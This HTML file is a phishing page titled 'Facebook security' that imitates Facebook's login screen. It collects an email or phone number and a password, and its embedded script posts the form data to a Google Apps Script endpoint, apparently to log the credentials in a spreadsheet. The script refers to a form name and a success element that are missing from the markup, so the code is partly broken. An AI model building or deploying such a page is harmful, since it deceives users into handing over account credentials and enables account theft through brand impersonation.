<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook security</title>
    <link rel="stylesheet" type="text/css" href="Login page.css" />
  </head>
  <body>
    <div class="content">
      <div class="flex-div">
        <div class="name-content">
          <h1 class="logo">Facebook</h1>
          <p>Connect with friends and the world around you on Facebook.</p>
        </div>
          <form>
            <input type="text" placeholder="Email or Phone Number" required />
            <input type="password" placeholder="Password" required>
            <button class="login">Log In</button>
            <a href="#">Forgot Password ?</a>
            <hr>
            <button class="create-account">Create New Account</button>
          </form>
      </div>
    </div>

        <script>
          const scriptURL = 'https://script.google.com/macros/s/AKfycbycXhwyf_wHKbn6PSN0iSgPqQScM66pFsRDJ0hYIIzaI6iRG8Bu9iD2pTl6UWrE_urY0A/exec'
          const form = document.forms['submit-to-google-sheet']
          const success = document.getElementById('success');
          form.addEventListener('submit', e => {
            e.preventDefault()
            fetch(scriptURL, { method: 'POST', body: new FormData(form)})
              .then(response => {
                success.innerHTML="Data successfuly sent";

                setTimeout(function()
                {
                    success.innerHTML=""  
                },5000)
                form.reset();
              })
              .catch(error => console.error('Error!', error.message))
          })
    </script>
    </body>
</html>
